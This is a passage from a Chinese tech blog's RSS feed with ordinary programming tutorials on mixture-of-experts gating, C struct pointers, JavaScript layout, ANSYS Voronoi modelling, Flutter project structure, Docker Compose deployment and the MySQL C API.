i
​
​
其中，
W g W_g
W
g
​
是门控网络的权重矩阵，
x x
x
是输入，
G ( x ) i G(x)_i
G
(
x
)
i
​
是专家
i i
i
的选择概率。
softmax函数确保所有专家的权重之和为1。
在实际应用中，为了提高效率，门控网络通常会限制只选择少数
k k
k
个专家来参与推理。例如，可以选择概率值最高的
k k
k
个专家，而其余专家的权重则被设为零。这样可以减少计算量，形成稀疏化选择。
c. 稀疏门控与稀疏选择
MOE的一个关键特性是稀疏选择，具体而言，门控网络通常只会选择少数
k k
k
个专家(通常
k ≪ N k \ll N
k
≪
N
)，
即
G ( x ) G(x)
G
(
x
)
是稀疏向量。
为了实现稀疏选择，可以采用Top-K算法，仅激活那些门控得分最高的专家：
T o p − K ( G ( x ) , k ) = { i ∣ G ( x ) i ∈ Top  k largest values of  G ( x ) } Top-K(G(x), k) = \{i \mid G(x)_i \in \text{Top } k \text{ largest values of } G(x)\}
T
o
p
−
K
(
G
(
x
)
,
k
)
=
{
i
∣
G
(
x
)
i
​
∈
Top
k
largest values of
G
(
x
)}
这种稀疏选择方式能够显著减少计算成本，因为每次推理只需激活
k k
k
个专家，而非所有专家。同时，这也减少了内存占用。
3. MOE 的训练过程
在训练MOE时，需要考虑两点：
稀疏性
：由于每次只有少数专家被激活，训练过程中每个专家可能只接触到部分数据，这会导致某些专家的更新频率较低。因此，MOE模型训练时会设计特殊的损失函数，确保专家的利用率尽可能均衡。
负载均衡损失（Load Balancing Loss）
：为了避免某些专家被频繁激活，而其他专家几乎不被使用，MOE引入了负载均衡损失项，鼓励所有专家都能在训练过程中被均衡使用。负载均衡损失的目标是让所有专家的激活次数接近相同。
一个常见的负载均衡损失函数是：
L balance = λ ⋅ ∑ i = 1 N ( 1 N − 1 B ∑ b = 1 B G ( x b ) i ) 2 L_{\text{balance}} = \lambda \cdot \sum_{i=1}^N \left( \frac{1}{N} - \frac{1}{B} \sum_{b=1}^B G(x_b)_i \right)^2
L
balance
​
=
λ
⋅
∑
i
=
1
N
​
(
N
1
​
−
B
1
​
∑
b
=
1
B
​
G
(
x
b
​
)
i
​
)
2
其中：
B B
B
是批量大小，
G ( x b ) i G(x_b)_i
G
(
x
b
​
)
i
​
是输入
x b x_b
x
b
​
对第
i i
i
个专家的选择概率，
N N
N
是专家的总数，
λ \lambda
λ
是控制平衡损失权重的超参数。
这个损失项鼓励门控网络让每个专家的激活频率接近于
1 / N 1/N
1/
N
，避免某些专家被频繁激活，而其他专家很少参与计算。
4. MOE的优势
计算效率
：通过稀疏选择机制，MOE架构避免了让所有专家都参与推理，降低了计算复杂度。实际中，MOE架构的计算量可以近似为
O ( k ⋅ n ) O(k \cdot n)
O
(
k
⋅
n
)
，其中
k k
k
是激活的专家数量，
n n
n
是输入序列长度。
扩展性
：MOE非常适合大规模模型。通过增加专家数量，可以扩大模型容量，而不显著增加每次推理的计算成本。这使得MOE特别适合用于超大规模语言模型，如Switch Transformer、GShard等。
灵活性
：MOE能够根据输入动态选择专家，因此它具有灵活的模型结构，可以处理不同类型的任务和数据。
5. MOE的应用
MOE被广泛应用于大规模模型的构建和优化，例如：
自然语言处理（NLP）
：在语言建模、机器翻译等任务中，MOE能够在不显著增加计算量的情况下大幅提升模型的性能。
视觉任务
：在图像分类和检测任务中，MOE通过不同专家处理不同的图像特征，提高了模型的泛化能力。
多模态任务
：MOE还可以用于处理多模态数据，例如视觉-语言任务，利用不同专家处理不同模态的信息。
6. 总结
MOE架构的核心思想是通过动态稀疏激活机制，只选择最相关的少数专家参与计算，降低了计算成本，同时保持了较高的模型容量。数学上，它通过门控网络选择最优的专家子集来处理每个输入，结合负载均衡机制确保专家的均匀利用。
MOE通过以下几方面的设计来提升模型性能和效率：
稀疏选择专家
，降低计算复杂度。
门控网络
根据输入动态选择专家。
负载均衡损失
确保专家均衡利用。
这种架构特别适用于大规模深度学习模型，尤其是需要高效推理和训练的场景。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540069.html</guid><pubDate>Fri, 31 Oct 2025 07:22:55 +0000</pubDate></item><item><title>C语言：符号“-＞”在C语言中什么意思呢？</title><link>https://www.ppmy.cn/news/1540070.html</link><description>1.C语言中符号“-&gt;”的意义：
‌指针中的
-&gt;
表示用于访问指针所指向的结构体或联合体的成员。‌ 这是一个操作符，通常用于简化代码，可以替代使用
(*ptr).member
的方式。
-&gt;
操作符的具体用法是，当你有一个指向结构体的指针时，可以使用
-&gt;
操作符直接访问该结构体的成员。例如，如果有一个指向结构体的指针ptr，结构体中有一个成员变量member，你可以使用
ptr-&gt;member
来访问这个成员变量‌。
2.代码实例体会：
代码片段一：
#
include
&lt;stdio.h&gt;
struct
Point
{
int
x
;
int
y
;
}
;
int
main
(
)
{
struct
Point
points
[
]
=
{
{
1
,
2
}
,
{
3
,
4
}
,
{
5
,
6
}
}
;
struct
Point
*
ptr
=
points
;
// 指针指向结构体数组的第一个元素
printf
(
"初始点: (%d, %d)\n"
,
ptr
-&gt;
x
,
ptr
-&gt;
y
)
;
// 输出 (1, 2)
ptr
++
;
// 递增指针，使其指向下一个结构体
printf
(
"递增后点: (%d, %d)\n"
,
ptr
-&gt;
x
,
ptr
-&gt;
y
)
;
// 输出 (3, 4)
return
0
;
}
当上面的代码被编译和执行时，它会产生下列结果：
初始点:
(
1
,
2
)
递增后点:
(
3
,
4
)
代码片段二：
/*定义结构体*/
struct
Data
{
int
a
,
b
,
c
;
}
;
struct
Data
*
p
;
/*定义结构体指针*/
struct
Data
A
=
{
1
,
2
,
3
}
;
/*声明变量A*/
int
x
;
/*声明一个变量x*/
p
=
&amp;
A
;
/*让p指向A*/
x
=
p
-
&gt;
a
;
/*这句话的意思就是 取出p所指向的结构体中包含的数据项a 赋值给x*/
/*由于此时p指向 A，因而 p-&gt;a  == A.a , 也就是1*/
-&gt;
操作符相当于结构体类型数据成员访问方法的
语法糖</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540070.html</guid><pubDate>Fri, 31 Oct 2025 07:22:56 +0000</pubDate></item><item><title>如何利用js操作复杂css布局，实现元素的显示隐藏，并自适应宽高</title><link>https://www.ppmy.cn/news/1540071.html</link><description>在大多数业务场景中我们使用的都是固定布局，即使是flex布局也是固定好的，顶多是一侧固定宽度，剩余自适应缩放。但是有些场景可能需要对窗口进行拆分，比如，设置一个分屏，将内容区域一分为二。或者，将屏幕动态的拆分为不规则行列布局，比如左侧一列，右侧垂直等分两行等布局。这种场景要利用js去改变元素的css样式了。主要是操作dom，获取dom元素，给dom加style或class。
复杂的css布局，除了获取要改变元素自身的dom节点，还可能操作兄弟节点，或者父级节点。因为自身定位的改变也会影响其他元素。因此，掌握几个js获取dom节点的方法即可。更改样式通常有两种，一是获取dom然后通过style更改样式，这种优先级高，适合快速调整布局，且布局样式多，不用定义过度的class；另一种是自定义几个class样式类，根据不同布局方式，动态给元素加上匹配的class，这种适合布局简单，在两个状态内切换。可根据情况自行选择。
js实现复杂css布局 步骤
在JavaScript中操作复杂的CSS布局通常涉及到DOM操作和样式更改。
事件监听
：可以通过事件监听来响应用户的交互，例如点击事件、鼠标移动事件等，从而动态更改元素的样式。
获取元素
：首先，你需要获取你想要操作的元素。这可以通过
document.getElementById
、
document.querySelector
或
document.querySelectorAll
等方法来实现。
更改样式
：一旦你获取了元素，你可以通过更改其
style
属性来改变它的样式。可以更改
display
属性来控制元素的显示隐藏，更改
height
和
width
属性来控制元素的宽高。更改
backgroundColor
、
color
、
fontSize
等属性。
添加或移除类
：另一种方法是通过添加或移除类来更改元素的样式。这可以通过
classList
属性来实现，它允许你添加、移除或切换类
获取元素举例
const container = document.getElementById("container") as HTMLDivElement;
更改样式举例
比如，一个div内部有两个兄弟节点，这两个div有三种分布情况：宽度100%：0，0：100%，50%：50%。即单独占全部，以及分屏情况。
这里操作的是右侧节点，previousSlibing获取的是前面的兄弟节点。
获取dom元素后，就可以拿到dom的所有属性，包括style样式，通过style可以操作宽高等css样式。
export const getViewDistribution = (type: ViewDistribution) =&gt; {const viewContainer = document.getElementById("extraView") as HTMLDivElement;switch (type) {case ViewDistribution.MainView:viewContainer.style.width = "0%";(viewContainer.previousSibling as HTMLElement).style.width = "100%";return;case ViewDistribution.ExtraView:viewContainer.style.width = "100%";(viewContainer.previousSibling as HTMLElement).style.width = "0%";return;case ViewDistribution.MainViewAndExtraView:viewContainer.style.width = "50%";(viewContainer.previousSibling as HTMLElement).style.width = "50%";return;}
};
添加或移除class举例
view.div.classList.toggle("hidden",!visible);
view.visible = visible;// 重新计算extraViews的高度
const visibleExtraViews = extraViews.filter((view) =&gt; view.visible);
const height = 100 / visibleExtraViews.length;
visibleExtraViews.forEach((view) =&gt; {view.div.style.height = height + "%";
});
这里使用
classList.toggle
方法来切换
hidden
类。如果
visible
是
true
，那么
hidden
类将被移除；如果
visible
是
false
，那么
hidden
类将被添加。这样，我们就可以通过类来控制元素的显示和隐藏，而不是直接操作
style
属性。
自适应布局举例
display属性进行隐藏，隐藏的元素不占位，通过这个特性进行隐藏，更改剩余元素布局。
可以通过遍历剩余可见元素，进行布局，以下是等分高度的例子，根据实际情况进行布局的调整
view.div.style.display = visible ? "block" : "none";view.visible = visible;// 重新计算views的高度const visibleViews = views.filter((view) =&gt; view.visible);const height = 100 / visibleViews .length;visibleViews .forEach((view) =&gt; {view.div.style.height = height + "%";});
相信有了这个介绍，你应该不惧怕自适应布局了，js操作dom布局也很esay</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540071.html</guid><pubDate>Fri, 31 Oct 2025 07:23:00 +0000</pubDate></item><item><title>ANSYS Workbench三维Voronoi骨架网格结构</title><link>https://www.ppmy.cn/news/1540072.html</link><description>Voronoi 3D骨架结构是从Voronoi图中提取出的骨架部分，它代表了原始Voronoi图的主要连接路径。这种骨架可以被看作原始结构的一种简化表示，常用于描述多孔材料、生物组织如骨小梁结构等复杂形态的内部网络。
在工程和科学研究中，Voronoi骨架结构几何模型经常被用来模拟多孔材料，也被广泛应用于各种仿真软件中，以研究材料力学性能、热传导、流体渗透等问题。
ANSYS Workbench内建立三维Voronoi骨架几何模型可以采用CAD泰森多边形框架3D插件建模后导入到Workbench内。在插件内设置模型参数后运行即可在AutoCAD内建Voronoi骨架结构3D模型。
在CAD内将Voronoi网格骨架实体模型导出为IGES格式文件，即可导入到ANSYS内，导入后可添加其他部件及对Voronoi模型进行网格划分 。
对Voronoi模型施加荷载，这里添加位移条件。
模拟Voronoi三维骨架结构的受冲击破坏情况。
CAD泰森多边形框架3D插件</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540072.html</guid><pubDate>Fri, 31 Oct 2025 07:23:02 +0000</pubDate></item><item><title>【Flutter】基础入门：项目结构</title><link>https://www.ppmy.cn/news/1540073.html</link><description>Flutter 是一款用于开发跨平台应用的优秀框架。通过一次编写代码，Flutter 可以将应用部署到 Android、iOS、Web、Windows、Linux 和 macOS 等多个平台。作为 Flutter 开发者，理解 Flutter 项目的目录结构和配置是至关重要的，能够帮助你快速构建、维护和扩展应用程序。
本教程将逐步介绍 Flutter 项目的目录结构，详细讲解每个重要文件的作用，并逐步学习如何配置项目，如添加依赖、设置应用名称和图标等。
创建 Flutter 项目
在深入理解 Flutter 项目结构之前，我们先创建一个新的 Flutter 项目。你可以使用以下命令创建一个 Flutter 项目：
flutter create my_flutter_app
创建成功后，你会得到一个标准的 Flutter 项目结构，包含多个文件和文件夹。接下来我们将逐步分析每个部分的作用。
Flutter 项目结构解析
my_flutter_app/
├── android/
├── ios/
├── lib/
│   └── main.dart
├── test/
├── web/
├── pubspec.yaml
├── .gitignore
├── README.md
└── build/
lib/
文件夹
lib/
是存放应用程序核心代码的目录，所有的 Dart 代码都放在这里。默认情况下，
lib/
目录中只有一个文件
main.dart
，它是应用程序的入口点。
lib/main.dart
main.dart
文件是 Flutter 项目的主文件，它定义了应用的入口函数和主界面。
import
'package:flutter/material.dart'
;
void
main
(
)
{
runApp
(
const
MyApp
(
)
)
;
}
class
MyApp
extends
StatelessWidget
{
const
MyApp
(
{
Key
?
key
}
)
:
super
(
key
:
key
)
;
@override
Widget
build
(
BuildContext context
)
{
return
MaterialApp
(
title
:
'Flutter Demo'
,
theme
:
ThemeData
(
primarySwatch
:
Colors
.
blue
,
)
,
home
:
const
MyHomePage
(
title
:
'Flutter Demo Home Page'
)
,
)
;
}
}
class
MyHomePage
extends
StatelessWidget
{
final
String title
;
const
MyHomePage
(
{
Key
?
key
,
required
this
.
title
}
)
:
super
(
key
:
key
)
;
@override
Widget
build
(
BuildContext context
)
{
return
Scaffold
(
appBar
:
AppBar
(
title
:
Text
(
title
)
,
)
,
body
:
const
Center
(
child
:
Text
(
'Hello, Flutter!'
)
,
)
,
)
;
}
}
main()
函数
：Dart 应用的入口函数。
runApp()
方法启动整个应用并将
MyApp
作为根部件渲染。
MaterialApp
：这是 Flutter 提供的用于构建 Material Design 风格应用的主部件。
Scaffold
：用于创建一个基础的视觉框架（如 AppBar、Drawer、BottomNavigationBar）。
通常，随着项目的复杂化，开发者会将代码拆分到多个 Dart 文件中，并通过
lib/
下的不同子文件夹来组织代码，如
lib/screens/
、
lib/widgets/
、
lib/models/
等。
pubspec.yaml
文件
pubspec.yaml
是 Flutter 项目的配置文件，它用于管理项目的依赖、资源和其他元数据。在这个文件中，你可以：
定义应用的名称、版本和描述。
添加第三方包（依赖）。
声明项目中使用的资源（图片、字体、音频等）。
配置应用的图标和启动画面。
pubspec.yaml 示例
name
:
my_flutter_app
description
:
A new Flutter project.
version
:
1.0.0+1
environment
:
sdk
:
"&gt;=2.19.0 &lt;3.0.0"
dependencies
:
flutter
:
sdk
:
flutter
# 第三方依赖
http
:
^0.15.0
dev_dependencies
:
flutter_test
:
sdk
:
flutter
flutter
:
assets
:
-
assets/images/
fonts
:
-
family
:
Roboto
fonts
:
-
asset
:
fonts/Roboto
-
Regular.ttf
name
和
description
：定义应用的名称和描述。
version
：应用的版本号，格式为
major.minor.patch+build
。
dependencies
：声明项目中使用的依赖包，如
http
包。
flutter
：用于声明 Flutter 相关的配置项，如资源文件（assets）和自定义字体。
如何添加依赖
在
dependencies:
下添加第三方包的名称和版本号。例如，如果你想要添加 HTTP 请求功能，可以在
pubspec.yaml
中添加
http
包：
dependencies
:
flutter
:
sdk
:
flutter
http
:
^0.15.0
然后运行以下命令来安装依赖：
flutter pub get
android/
和
ios/
文件夹
android/
和
ios/
文件夹分别用于存放原生平台的相关代码和配置。这两个文件夹允许 Flutter 项目与原生 Android 和 iOS 平台进行交互，使用平台特定的功能和资源。
android/
android/
文件夹包含 Android 原生项目结构，用于与 Android 相关的配置和代码集成。你可以在这里修改 Android 应用的包名、版本号、最小 SDK 版本等。
android/app/src/main/AndroidManifest.xml
：Android 项目的核心配置文件，用于声明权限、应用名称、图标、主题等。
android/app/build.gradle
：定义 Android 项目的构建配置，如 SDK 版本、应用的依赖等。
ios/
ios/
文件夹类似于
android/
，它包含 iOS 平台相关的配置和代码。你可以在这里修改 iOS 应用的版本号、权限声明等。
ios/Runner/Info.plist
：iOS 应用的配置文件，用于声明应用的信息（名称、版本、图标等）和权限。
ios/Runner.xcodeproj
：这是一个 Xcode 项目文件，你可以在 Xcode 中打开它来配置和构建 iOS 应用。
设置应用名称和图标
设置应用名称：
Android
：在
android/app/src/main/AndroidManifest.xml
中找到以下代码并修改
android:label
为你想要的名称：
&lt;
application
android:
label
=
"
My Flutter App
"
android:
icon
=
"
@mipmap/ic_launcher
"
&gt;
iOS
：在
ios/Runner/Info.plist
中找到
CFBundleName
键并修改其值：
&lt;
key
&gt;
CFBundleName
&lt;/
key
&gt;
&lt;
string
&gt;
My Flutter App
&lt;/
string
&gt;
设置应用图标：
Android
：将你的图标文件放在
android/app/src/main/res/mipmap-*
文件夹中，然后更新
android:icon
属性的路径：
android:icon="@mipmap/ic_launcher"
iOS
：将你的图标文件放在
ios/Runner/Assets.xcassets/AppIcon.appiconset/
中，并使用 Xcode 修改图标设置。
test/
文件夹
test/
文件夹包含应用的测试代码。Flutter 提供了强大的测试框架，你可以编写单元测试、集成测试和 Widget 测试，确保应用程序的各个部分正常工作。
示例测试代码
import
'package:flutter_test/flutter_test.dart'
;
void
main
(
)
{
test
(
'String should be reversed'
,
(
)
{
String
reverseString
(
String s
)
=
&gt;
s
.
split
(
''
)
.
reversed
.
join
(
''
)
;
expect
(
reverseString
(
'hello'
)
,
'olleh'
)
;
}
)
;
}
通过
flutter test
命令可以运行测试：
flutter
test
web/
文件夹
如果你打算构建 Flutter Web 应用，
web/
文件夹会包含相关的配置文件。它主要用于配置 Web 端的静态资源（HTML、CSS 等）。
index.html
：这是 Flutter Web 应用的入口文件，包含应用的基础 HTML 结构。
其他文件
.gitignore
：定义哪些文件和文件夹在使用 Git 进行版本控制时应被忽略。
README.md
：项目的自述文件，通常用于描述项目的概述、功能、使用方法等信息。
build/
：存储 Flutter 构建生成的中间文件，一般不需要手动修改。
总结
通过本教程，你现在应该对 Flutter 项目的目录结构有了详细的了解，掌握了
lib/main.dart
文件的作用和应用的启动流程，理解了如何通过
pubspec.yaml
文件添加依赖、管理资源、设置应用名称和图标。同时，你还学习了如何配置 Android 和 iOS
项目文件，了解了
test/
和
web/
目录的基本用途。
在实际开发中，掌握这些知识将帮助你更高效地管理 Flutter 项目结构，并在跨平台开发中保持良好的代码组织和配置管理。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540073.html</guid><pubDate>Fri, 31 Oct 2025 07:23:05 +0000</pubDate></item><item><title>Dockerfile + docker-compose 构建java镜像并运行服务</title><link>https://www.ppmy.cn/news/1540074.html</link><description>🏝️ 博主介绍
大家好，我是一个搬砖的农民工，很高兴认识大家 😊 ~
👨‍🎓
个人介绍
：
本人是一名后端Java开发工程师，坐标北京 ~
🎉 感谢关注 📖 一起学习 📝 一起讨论 🌈 一起进步 ~
🙏 作者水平有限，欢迎各位大佬指正留言，相互学习进步 ~
目录
🏝️ 博主介绍
1. 目录结构 🚀
2. Dockerfile 🚀
3. docker-compose 🚀
4. 执行命令 🚀
5. 开通防火墙端口 🚀
1. 目录结构 🚀
⭐
docker-compose.yml
：
/opt/pro_xx/jar
⭐
Dockerfile
：
/opt/pro_xx/jar/springboot-basis
⭐
springboot-basis.jar
:
/opt/pro_xx/jar/springboot-basis
[root@localhost jar]
# ls
docker
-
compose
.
yml  springboot
-
basis
[root@localhost jar]
# ls springboot-basis
Dockerfile  springboot
-
basis
.
jar
2. Dockerfile 🚀
# AdoptOpenJDK 停止发布 OpenJDK 二进制，而 Eclipse Temurin 是它的延伸，提供更好的稳定性
FROM eclipse-temurin:8-jre
## 创建目录，并使用它作为工作目录
RUN
mkdir
-p /opt/pro_xx/jar/springboot-basis
WORKDIR /opt/pro_xx/jar/springboot-basis
## 将后端项目的 Jar 文件，复制到镜像中，前面是当前目录，后面是镜像中目录
COPY ./springboot-basis/springboot-basis.jar springboot-basis.jar
## 设置 TZ 时区
## 设置 JAVA_OPTS 环境变量，可通过 docker run -e "JAVA_OPTS=" 进行覆盖
ENV
TZ
=
Asia/Shanghai
JAVA_OPTS
=
"-Xms128m -Xmx128m"
## 暴露后端项目的 8082 端口
EXPOSE
8082
## 启动后端项目
## -Djava.security.egd=file:/dev/./urandom 是一个 Java 系统属性设置，用于指定随机数生成器的源
## /dev/urandom：这是一个非阻塞型随机数生成器
CMD java
${JAVA_OPTS}
-Xms128m -Xmx128m -Djava.security.egd
=
file:/dev/./urandom -jar springboot-basis.jar
3. docker-compose 🚀
# version: '3.8'  新版本不需要指定
services:  springboot-basis:  build:  context:
.
# 指定docker-compose.yml文件所在的目录为构建上下文
dockerfile: springboot-basis/Dockerfile
# 指定app1目录下的Dockerfile
image: springboot-basis-image
# 为构建的镜像指定一个名称
container_name: springboot-basis-container
# 为容器指定一个名称（可选）
ports:  -
"8082:8082"
networks:  - app_network  restart: unless-stopped
# 重启策略
# 网络
networks:  app_network:  driver: bridge
4. 执行命令 🚀
[root@localhost jar]
# pwd
/
opt
/
pro_xx
/
jar
[root@localhost jar]
# ls
docker
-
compose
.
yml  springboot
-
basis
[root@localhost jar]
# docker-compose up -d
[
+
]
Running 2
/
2✔ Network jar_app_network               Created                                                                              0
.
2s✔ Container springboot
-
basis
-
container  Started                                                                              0
.
2s
[root@localhost jar]
# docker-compose ps
NAME                         IMAGE                    COMMAND                  SERVICE            CREATED              STATUS              PORTS
springboot
-
basis
-
container   springboot
-
basis
-
image
"/__cacert_entrypoin…"
springboot
-
basis   About a minute ago   Up About a minute   0
.
0
.
0
.
0:8082
-
&gt;8082
/
tcp
,
:::8082
-
&gt;8082
/
tcp
🌈 重新构建
[root@localhost jar]
# docker-compose down
[
+
]
Running 2
/
2✔ Container springboot
-
basis
-
container  Removed                                                                             10
.
1s✔ Network jar_app_network               Removed                                                                              0
.
1s
# 这里需要加--build才能重新构建镜像，否则使用已存在镜像
[root@localhost jar]
# docker-compose up --build -d
[
+
]
Building 18
.
2s
(
9
/
9
)
FINISHED                                                                              docker:default=&gt;
[springboot-basis internal]
load build definition
from
Dockerfile                                                         0
.
0s=&gt; =&gt; transferring dockerfile: 1
.
02kB                                                                                        0
.
0s=&gt;
[springboot-basis internal]
load metadata
for
docker
.
io
/
library
/
eclipse
-
temurin:8
-
jre                                    18
.
0s=&gt;
[springboot-basis internal]
load
.
dockerignore                                                                            0
.
0s=&gt; =&gt; transferring context: 2B                                                                                               0
.
0s=&gt;
[springboot-basis 1/4]
FROM
docker
.
io
/
library
/
eclipse
-
temurin:8
-
jre@sha256:fb70a1d7a31c4e1fe5efdca36dc35cfe7e593a3be70d2  0
.
0s=&gt;
[springboot-basis internal]
load build context                                                                            0
.
1s=&gt; =&gt; transferring context: 24
.
92MB                                                                                          0
.
1s=&gt; CACHED
[springboot-basis 2/4]
RUN mkdir
-
p
/
opt
/
pro_xx
/
jar
/
springboot
-
basis                                               0
.
0s=&gt; CACHED
[springboot-basis 3/4]
WORKDIR
/
opt
/
pro_xx
/
jar
/
springboot
-
basis                                                    0
.
0s=&gt;
[springboot-basis 4/4]
COPY
.
/
springboot
-
basis
/
springboot
-
basis
.
jar springboot
-
basis
.
jar                                  0
.
1s=&gt;
[springboot-basis]
exporting to image                                                                                     0
.
0s=&gt; =&gt; exporting layers                                                                                                       0
.
0s=&gt; =&gt; writing image sha256:26f4766dec23d1f053e5a8a6d8afbb2a58beeb9511752ab7f611edcfb2c20bed                                  0
.
0s=&gt; =&gt; naming to docker
.
io
/
library
/
springboot
-
basis
-
image                                                                     0
.
0s
[
+
]
Running 2
/
2✔ Network jar_app_network               Created                                                                              0
.
1s✔ Container springboot
-
basis
-
container  Started                                                                              0
.
2s
5. 开通防火墙端口 🚀
🍨 如果需要对外访问，需要开通服务器防火墙
⚡ 推荐参考：CentOS 系统如何在防火墙开启端口
sudo firewall
-
cmd
--
zone=public
--
permanent
--
add-port
=8082
/
tcp
sudo firewall
-
cmd
--
reload
sudo firewall
-
cmd
--
zone=public
--
list
-
ports</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540074.html</guid><pubDate>Fri, 31 Oct 2025 07:23:07 +0000</pubDate></item><item><title>MySQL C/C++ 的 API</title><link>https://www.ppmy.cn/news/1540075.html</link><description>MySQL 提供了一个用于 C/C++ 的 API，称为 MySQL Connector/C。该 API 允许通过 C/C++ 程序与 MySQL 数据库进行交互。
函数名称
参数
返回值
描述
mysql_init
MYSQL *mysql
MYSQL *
初始化一个 MySQL 对象，用于连接 MySQL 服务器。
mysql_real_connect
MYSQL *mysql, const char *host, const char *user, const char *passwd, const char *db, unsigned int port, const char *unix_socket, unsigned long client_flag
MYSQL *
连接到 MySQL 数据库服务器。
mysql_close
MYSQL *mysql
void
关闭与 MySQL 服务器的连接。
mysql_query
MYSQL *mysql, const char *query
int
执行一条 SQL 查询。返回 0 表示成功，非 0 表示失败。
mysql_store_result
MYSQL *mysql
MYSQL_RES *
检索完整的结果集。返回指向结果集的指针，或者失败时返回 NULL。
mysql_free_result
MYSQL_RES *result
void
释放结果集的内存。
mysql_fetch_row
MYSQL_RES *result
MYSQL_ROW
从结果集中获取下一行。返回表示行的数组，或者没有更多数据时返回 NULL。
mysql_affected_rows
MYSQL *mysql
my_ulonglong
返回最近执行的 SQL 语句影响的行数。
mysql_num_rows
MYSQL_RES *result
my_ulonglong
返回结果集中行的数量。
mysql_num_fields
MYSQL_RES *result
unsigned int
返回结果集中的字段数。
mysql_error
MYSQL *mysql
const char *
返回最近一次 MySQL 操作的错误消息字符串。
mysql_real_escape_string
MYSQL *mysql, char *to, const char *from, unsigned long length
unsigned long
转义字符串中的特殊字符，使其可以安全地用于 SQL 语句中。
mysql_commit
MYSQL *mysql
int
提交当前事务。返回 0 表示成功，非 0 表示失败。
mysql_rollback
MYSQL *mysql
int
回滚当前事务。返回 0 表示成功，非 0 表示失败。
mysql_set_character_set
MYSQL *mysql, const char *charset
int
设置当前连接使用的字符集。返回 0 表示成功，非 0 表示失败。
mysql_autocommit
MYSQL *mysql, my_bool mode
int
开启或关闭自动提交功能。传入 0 表示关闭，1 表示开启。
mysql_stmt_init
MYSQL *mysql
MYSQL_STMT *
初始化一个预处理语句句柄。
mysql_stmt_prepare
MYSQL_STMT *stmt, const char *query, unsigned long length
int
预处理一个 SQL 查询。返回 0 表示成功，非 0 表示失败。
mysql_stmt_bind_param
MYSQL_STMT *stmt, MYSQL_BIND *bind
int
绑定参数到预处理语句。
mysql_stmt_bind_result
MYSQL_STMT *stmt, MYSQL_BIND *bind
int
绑定结果变量到预处理语句。
mysql_stmt_execute
MYSQL_STMT *stmt
int
执行一个预处理语句。返回 0 表示成功，非 0 表示失败。
mysql_stmt_fetch
MYSQL_STMT *stmt
int
获取执行结果中的下一行。返回 0 表示成功，非 0 表示失败或无更多行。
mysql_stmt_close
MYSQL_STMT *stmt
int
关闭一个预处理语句句柄。返回 0 表示成功，非 0 表示失败。
mysql_stmt_result_metadata
MYSQL_STMT *stmt
MYSQL_RES *
获取一个预处理语句执行后返回结果的元数据。返回结果集结构指针，或者 NULL 表示没有元数据。
mysql_stmt_num_rows
MYSQL_STMT *stmt
my_ulonglong
获取结果集中返回的行数。
mysql_stmt_store_result
MYSQL_STMT *stmt
int
将完整的结果集存储在客户端内存中。返回 0 表示成功，非 0 表示失败。
mysql_stmt_free_result
MYSQL_STMT *stmt
void
释放预处理语句的结果集。
mysql_stmt_reset
MYSQL_STMT *stmt
int
重置预处理语句，使其可以重新执行。返回 0 表示成功，非 0 表示失败。
说明
返回值为
int
类型的函数
：通常 0 表示成功，非 0 表示失败。
返回值为指针的函数
：通常返回一个指向对象的指针，
NULL
表示失败。
MYSQL_BIND
是一个用于绑定参数或结果的结构，通常用于预处理语句（
mysql_stmt
）相关的函数中。
1.
初始化 MySQL 连接
函数
mysql_init
用于初始化 MySQL 连接。
#include &lt;mysql/mysql.h&gt;
MYSQL *mysql_init(MYSQL *mysql);
参数
:
mysql
：指向 MYSQL 结构体的指针，可以为
NULL
。
返回值
:
成功：返回一个 MYSQL 结构体指针。
失败：返回
NULL
。
示例
:
MYSQL *conn;
conn = mysql_init(NULL);
if (conn == NULL) {
fprintf(stderr, "mysql_init() failed\n");
exit(EXIT_FAILURE);
}
2.
连接数据库
使用
mysql_real_connect
函数建立与数据库的连接。
MYSQL *mysql_real_connect(MYSQL *mysql, const char *host, const char *user, const char *passwd, const char *db, unsigned int port, const char *unix_socket, unsigned long client_flag);
参数
:
mysql
: 已初始化的 MYSQL 结构体指针。
host
: 数据库服务器地址（如 "localhost" 或 IP 地址）。
user
: 数据库用户名。
passwd
: 数据库用户密码。
db
: 需要连接的数据库名。
port
: MySQL 服务器的端口号，通常为 3306。
unix_socket
: 本地 Unix Socket，若未使用可设为
NULL
。
client_flag
: 客户端标志位，通常为 0。
返回值
:
成功：返回 MYSQL 结构体指针。
失败：返回
NULL
。
示例
:
if (mysql_real_connect(conn, "localhost", "user", "password", "testdb", 0, NULL, 0) == NULL) {
fprintf(stderr, "mysql_real_connect() failed\n");
mysql_close(conn);
exit(EXIT_FAILURE);
}
3.
执行 SQL 查询
函数
mysql_query
用于执行 SQL 语句。
int mysql_query(MYSQL *mysql, const char *query);
参数
:
mysql
: 已连接的 MYSQL 结构体指针。
query
: 要执行的 SQL 查询字符串。
返回值
:
成功：返回 0。
失败：返回非 0 值。
示例
:
if (mysql_query(conn, "CREATE TABLE test (id INT, name VARCHAR(20))")) {
fprintf(stderr, "CREATE TABLE failed. Error: %s\n", mysql_error(conn));
}
4.
获取查询结果
使用
mysql_store_result
获取查询的结果集，并使用
mysql_fetch_row
获取每一行的记录。
MYSQL_RES *mysql_store_result(MYSQL *mysql);
MYSQL_ROW mysql_fetch_row(MYSQL_RES *result);
参数
:
mysql_store_result
: 返回查询结果的指针，若查询不返回数据则返回
NULL
。
mysql_fetch_row
: 返回结果集中的下一行数据，若无更多数据返回
NULL
。
示例
:
if (mysql_query(conn, "SELECT id, name FROM test")) {
fprintf(stderr, "SELECT failed. Error: %s\n", mysql_error(conn));
}
MYSQL_RES *result = mysql_store_result(conn);
if (result == NULL) {
fprintf(stderr, "mysql_store_result() failed. Error: %s\n", mysql_error(conn));
}
int num_fields = mysql_num_fields(result);
MYSQL_ROW row;
while ((row = mysql_fetch_row(result))) {
for(int i = 0; i &lt; num_fields; i++) {
printf("%s ", row[i] ? row[i] : "NULL");
}
printf("\n");
}
mysql_free_result(result);
5.
关闭 MySQL 连接
使用
mysql_close
关闭与 MySQL 的连接。
void mysql_close(MYSQL *mysql);
参数
:
mysql
: 连接的 MYSQL 结构体指针。
示例
:
mysql_close(conn);
6.
错误处理
通过
mysql_error
获取最近的错误信息。
const char *mysql_error(MYSQL *mysql);
参数
:
mysql
: 连接的 MYSQL 结构体指针。
